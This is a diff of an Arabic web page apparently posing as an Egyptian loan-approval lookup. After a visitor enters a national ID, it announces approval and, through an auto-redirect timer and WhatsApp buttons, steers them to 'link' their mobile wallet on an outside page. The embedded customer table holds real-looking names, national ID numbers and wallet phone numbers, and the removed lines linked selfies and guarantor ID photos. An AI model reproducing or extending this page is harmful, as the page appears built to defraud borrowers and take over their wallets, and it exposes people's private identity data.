@@ -289,7 +289,6 @@
             font-weight: 600;
         }
 
-        /* تنسيقات المؤقتات والرسائل */
         .action-box {
             background: rgba(212, 175, 55, 0.15);
             border: 1px solid #D4AF37;
@@ -357,6 +356,13 @@
         }
         .info-section.warning strong {
             color: #ff6b35;
+        }
+        .info-section.success {
+            background: rgba(57, 255, 20, 0.1);
+            border-left-color: #39FF14;
+        }
+        .info-section.success strong {
+            color: #39FF14;
         }
         .data-table {
             width: 100%;
@@ -450,38 +456,6 @@
             color: #eef5ff;
         }
 
-        /* تنسيق الصور */
-        .image-row {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-bottom: 2rem;
-        }
-        .image-card {
-            background: rgba(0,0,0,0.5);
-            border-radius: 1rem;
-            padding: 1rem;
-            text-align: center;
-            flex: 1;
-            min-width: 250px;
-            border: 1px solid rgba(212,175,55,0.3);
-        }
-        .image-card p {
-            margin-top: 0.5rem;
-            color: #FFD966;
-            font-weight: bold;
-        }
-        .glow-image {
-            transition: all 0.3s ease;
-            max-width: 100%;
-            border-radius: 15px;
-        }
-        .glow-image:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 30px rgba(0,184,148,0.8);
-        }
-
         @media (max-width: 680px) {
             .logo h1 { font-size: 2.6rem; letter-spacing: 2px; }
             .search-title { font-size: 1.7rem; }
@@ -514,7 +488,7 @@
             أدخل رقمك القومي (14 رقم) لمعرفة حالة التمويل والبيانات المسجلة بكل أمان وشفافية
         </p>
         <div class="input-group">
-            <input type="text" id="nationalId" placeholder="مثال: 28611092200072" maxlength="14" inputmode="numeric">
+            <input type="text" id="nationalId" placeholder="مثال: 28911120201491" maxlength="14" inputmode="numeric">
         </div>
         <button class="btn-search" onclick="searchRequest()">
             <i class="fas fa-shield-alt"></i> استعلام فوري <i class="fas fa-arrow-left"></i>
@@ -526,9 +500,6 @@
             <h2><i class="fas fa-check-circle"></i> تهانينا! تمت الموافقة</h2>
             <p>✅ طلب التمويل الخاص بك معتمد وجاهز للربط</p>
         </div>
-
-        <!-- قسم عرض الصور -->
-        <div id="customerImagesSection" style="display: none; margin-bottom: 1.5rem;"></div>
 
         <div class="transparency-section">
             <h3><i class="fas fa-eye"></i> شفافية كاملة - بيانات التمويل</h3>
@@ -556,73 +527,95 @@
         </div>
     </div>
 
-    <div id="errorSection" class="error-card">
-        <i class="fas fa-exclamation-triangle"></i>
-        <p>⚠️ الرقم القومي غير مسجل في النظام<br>يرجى التأكد من الرقم أو التواصل مع الدعم للمساعدة</p>
+    <div id="errorSection" class="error-card" style="display: none; background: rgba(10, 10, 15, 0.9); backdrop-filter: blur(12px); border-radius: 48px; border: 1px solid #dc143c; padding: 35px; text-align: center; margin-top: 30px;">
+        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #dc143c; margin-bottom: 1rem;"></i>
+        <p style="font-size: 1.3rem;">⚠️ الرقم القومي غير مسجل في النظام<br>يرجى التأكد من الرقم أو التواصل مع الدعم للمساعدة</p>
     </div>
 </div>
 
 <script>
-    // ========== قاعدة العملاء الجدد (من ملف استمارة الخدمات المصرفية الرقمية) ==========
+    // ========== قاعدة العملاء (بما فيهم العميلة الجديدة صباح مسعد منصور ابراهيم) ==========
     const customersDatabase = {
-        "286112200072": { 
-            name: "محمود علي صالح خليل", 
-            loan: "160,000 ج.م", 
-            wallet: "فودافون كاش", 
-            walletNum: "01034272143", 
-            payment: "من يوم 1 إلى يوم 5",
-            customerImage: "https://i.ibb.co/RGgV4Lr5/taken-picture-1-Rw9-Wyq-D-Pz-PBR-3383867.jpg",
-            guarantorImage: "https://i.ibb.co/3rPFzSm5/inbound2464373295780695017.jpg"
+        "28911120201491": { 
+            name: "احمد ابراهيم عبدالعاطي", 
+            loan: "200,000 ج.م", 
+            wallet: "لا يوجد فودافون كاش او اتصالات كاش", 
+            walletNum: "غير مسجل", 
+            payment: "من يوم 1 إلى يوم 5"
         },
-        "291012610254": { 
-            name: "محمد ناصر محمد السيد", 
-            loan: "30,000 ج.م", 
-            wallet: "فودافون كاش", 
-            walletNum: "01017562770", 
-            payment: "من يوم 1 إلى يوم 5",
-            customerImage: "https://i.ibb.co/KzjPNzV7/taken-picture-1-Rw9-Wyq-D-7x-Ajj-3383867.jpg",
-            guarantorImage: "https://i.ibb.co/Y7dFRBGs/Screenshot-2026-04-11-15-40-49-58-40deb401b9ffe8e1df2f1cc5ba480b12.jpg"
-        },
-        "290100209372": { 
-            name: "محمد الخضرى الشهاوى الشهاوى", 
-            loan: "30,000 ج.م", 
-            wallet: "فودافون كاش", 
-            walletNum: "01008737891", 
-            payment: "من يوم 1 إلى يوم 5",
-            customerImage: "https://i.ibb.co/LsM7R4Pp/taken-picture-1Rw9Wyq-D-FLj8B-3383867.jpg",
-            guarantorImage: "https://i.ibb.co/YCQq29vg/inbound3584334512909867967.jpg"
-        },
-        "29401172600151": { 
-            name: "محمد احمد خلف الله عمر", 
-            loan: "30,000 ج.م", 
-            wallet: "اتصالات كاش", 
-            walletNum: "01129793519", 
-            payment: "من يوم 1 إلى يوم 5",
-            customerImage: "https://i.ibb.co/nzF8JVDw/taken-picture-1Rw9Wyq-D-Uxp-Oo-3383867.jpg",
-            guarantorImage: ""
-        },
-        "29802072200066": { 
-            name: "عبدالرحمن كمال معوض امبابى", 
+        "27702122102315": { 
+            name: "سامح محمد احمد حسن", 
             loan: "200,000 ج.م", 
             wallet: "اتصالات كاش", 
-            walletNum: "01101353222", 
-            payment: "من يوم 1 إلى يوم 5",
-            customerImage: "https://i.ibb.co/VYrjNLd6/taken-picture-1-Rw9-Wyq-D-vyz-Hs-3383867.jpg",
-            guarantorImage: "https://i.ibb.co/6c6Fyw1M/17757683811995630753632338854268.jpg"
+            walletNum: "01151686300", 
+            payment: "من يوم 1 إلى يوم 5"
         },
-        "29410011617371": { 
-            name: "علاء عبدالحكيم محمد درويش", 
-            loan: "40,000 ج.م", 
+        "28910011904914": { 
+            name: "محمد جمال احمد احمد", 
+            loan: "50,000 ج.م", 
             wallet: "فودافون كاش", 
-            walletNum: "01027250679", 
-            payment: "من يوم 1 إلى يوم 5",
-            customerImage: "https://i.ibb.co/spgFpvsp/creation-1400306871900038.jpg",
-            guarantorImage: "https://i.ibb.co/6c6Fyw1M/17757683811995630753632338854268.jpg"
+            walletNum: "01017550748", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "28010260105052": { 
+            name: "محمد مصطفى عيد عبده", 
+            loan: "40,000 ج.م", 
+            wallet: "اتصالات كاش", 
+            walletNum: "01111042022", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "27004091400372": { 
+            name: "محمد ابراهيم السيد الحمزاوي", 
+            loan: "200,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01097564831", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "28501210104776": { 
+            name: "حسين محمد حسين سليمان", 
+            loan: "155,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01092420593", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29510301600591": { 
+            name: "احمد عبدالله محمد عبدالهادى", 
+            loan: "30,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01095514885", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29407310101011": { 
+            name: "عبدالحميد محمد عبدالحميد موسي", 
+            loan: "35,000 ج.م", 
+            wallet: "اتصالات كاش", 
+            walletNum: "01128657468", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29607161400212": { 
+            name: "إسلام ياسر أحمد محمد", 
+            loan: "40,000 ج.م", 
+            wallet: "اتصالات كاش", 
+            walletNum: "01115088793", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        // العميلة الجديدة
+        "27305070101243": { 
+            name: "صباح مسعد منصور ابراهيم", 
+            loan: "40,000 ج.م", 
+            wallet: "اتصالات كاش", 
+            walletNum: "01148246521", 
+            payment: "من يوم 1 إلى يوم 5"
         }
     };
 
+    // دالة للتحقق من صحة وجود المحفظة (ليست فارغة أو "لا يوجد" أو "أخرى")
     function isWalletValid(walletType) {
-        return walletType && walletType !== "null" && walletType !== "أخرى";
+        return walletType && 
+               walletType !== "null" && 
+               walletType !== "أخرى" && 
+               walletType !== "لا يوجد فودافون كاش او اتصالات كاش" &&
+               walletType !== "غير مسجل";
     }
 
     let walletTimerInterval = null;
@@ -631,6 +624,7 @@
 
     function createParticles() {
         const particlesDiv = document.getElementById('particles');
+        if(!particlesDiv) return;
         for (let i = 0; i < 40; i++) {
             const particle = document.createElement('div');
             particle.classList.add('particle');
@@ -657,9 +651,9 @@
         if (box) {
             box.style.display = 'none';
             const msg = document.createElement('div');
-            msg.className = 'info-box success';
+            msg.className = 'info-section success';
             msg.style.marginTop = '0.5rem';
-            msg.innerHTML = '<i class="fas fa-ban"></i> تم إلغاء التوجيه التلقائي. يمكنك الضغط يدوياً على الزر أدناه.';
+            msg.innerHTML = '<i class="fas fa-ban"></i> تم إلغاء التوجيه التلقائي. يمكنك الضغط يدوياً على زر الربط أدناه.';
             const parent = document.getElementById('actionSection');
             const oldMsg = document.getElementById('cancelMsg');
             if (oldMsg) oldMsg.remove();
@@ -734,12 +728,10 @@
         const errorDiv = document.getElementById('errorSection');
         const dataTable = document.getElementById('dataTable');
         const actionDiv = document.getElementById('actionSection');
-        const imagesDiv = document.getElementById('customerImagesSection');
 
         resultDiv.style.display = 'none';
         errorDiv.style.display = 'none';
         actionDiv.innerHTML = '';
-        imagesDiv.innerHTML = '';
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
         if (redirectCountdownInterval) clearInterval(redirectCountdownInterval);
         if (walletTimerInterval) clearInterval(walletTimerInterval);
@@ -756,39 +748,13 @@
             return;
         }
 
-        // عرض صور العميل والضامن
-        if (customer.customerImage || customer.guarantorImage) {
-            imagesDiv.style.display = 'block';
-            let imagesHtml = '<div class="image-row">';
-            if (customer.customerImage) {
-                imagesHtml += `
-                    <div class="image-card">
-                        <img src="${customer.customerImage}" class="glow-image" onerror="this.parentElement.style.display='none'">
-                        <p>📸 صورة تأكيد الهوية (سيلفي العميل)</p>
-                    </div>
-                `;
-            }
-            if (customer.guarantorImage) {
-                imagesHtml += `
-                    <div class="image-card">
-                        <img src="${customer.guarantorImage}" class="glow-image" onerror="this.parentElement.style.display='none'">
-                        <p>🪪 صورة بطاقة الضامن</p>
-                    </div>
-                `;
-            }
-            imagesHtml += '</div>';
-            imagesDiv.innerHTML = imagesHtml;
-        } else {
-            imagesDiv.style.display = 'none';
-        }
-
-        // عرض بيانات العميل الأساسية
+        // عرض بيانات العميل الأساسية - تم حذف أي صور
         let rows = `
-            <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td>
-            <tr><td class="info-label">مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td>
-            <tr><td class="info-label">نوع المحفظة</td><td>${customer.wallet}</td>
-            <tr><td class="info-label">رقم المحفظة</td><td>${customer.walletNum}</td>
-            <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td>
+            <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td><tr>
+            <tr><td class="info-label">مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td></tr>
+            <tr><td class="info-label">نوع المحفظة المسجلة</td><td>${customer.wallet}</td></tr>
+            <tr><td class="info-label">رقم المحفظة</td><td>${customer.walletNum}</td></tr>
+            <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td></tr>
         `;
         dataTable.innerHTML = rows;
         resultDiv.style.display = 'block';
@@ -796,6 +762,7 @@
 
         const hasWallet = isWalletValid(customer.wallet);
         if (!hasWallet) {
+            // حالة عدم وجود محفظة: عرض مؤقت 4 ساعات مع زر واتساب لفتح المحفظة
             actionDiv.innerHTML = `
                 <div class="info-section warning">
                     <strong>⚠️ تنبيه هام:</strong> لا توجد محفظة إلكترونية مسجلة باسمك (فودافون كاش أو اتصالات كاش).
@@ -811,21 +778,25 @@
             `;
             startWalletTimer(4 * 3600);
         } else {
+            // حالة وجود محفظة: عرض خيارات الربط والتوجيه التلقائي
             actionDiv.innerHTML = `
                 <div class="info-section success">
-                    <strong>✅ محفظتك مسجلة وجاهزة للربط.</strong> يمكنك الآن ربط حسابك بالسيستم لتحويل القرض.
+                    <strong>✅ محفظتك مسجلة وجاهزة للربط.</strong> الخطوة التالية هي ربط حسابك بالنظام لتحويل مبلغ التمويل إلى محفظتك.
                 </div>
                 <div id="autoRedirectBox" class="action-box" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
-                    <span><i class="fas fa-hourglass-half"></i> سيتم توجيهك إلى رابط الربط تلقائياً خلال <span class="timer-number" id="redirectSeconds">10</span> ثوانٍ...</span>
+                    <span><i class="fas fa-hourglass-half"></i> سيتم توجيهك إلى رابط ربط الحساب تلقائياً خلال <span class="timer-number" id="redirectSeconds">10</span> ثوانٍ...</span>
                     <span class="cancel-redirect" onclick="cancelAutoRedirect()">إلغاء التوجيه</span>
                 </div>
-                <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 1rem;">
+                <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 1rem; flex-wrap: wrap;">
                     <button class="whatsapp-button" onclick='sendWhatsAppMessageForLinking(${JSON.stringify(customer).replace(/'/g, "\\'")})'>
                         <i class="fab fa-whatsapp"></i> إرسال بياناتي للربط عبر واتساب
                     </button>
                     <button class="whatsapp-button" style="background: linear-gradient(95deg, #D4AF37, #FFD966); color:#000;" onclick="window.open('${LINKING_URL}', '_blank')">
-                        <i class="fas fa-link"></i> رابط ربط الحساب (اضغط يدوياً)
+                        <i class="fas fa-link"></i> رابط ربط الحساب (اضغط يدوياً لبدء الربط)
                     </button>
+                </div>
+                <div class="info-section" style="margin-top: 1rem; text-align: center;">
+                    <i class="fas fa-arrow-left"></i> <strong>خطوة مهمة:</strong> بعد الضغط على زر "رابط ربط الحساب" أو التوجيه التلقائي، سيتم نقلك إلى صفحة الربط الآمنة لإتمام عملية تحويل التمويل.
                 </div>
             `;
             startAutoRedirect();
@@ -841,6 +812,5 @@
         if (e.key === 'Enter') searchRequest();
     });
 </script>
-
 </body>
 </html>
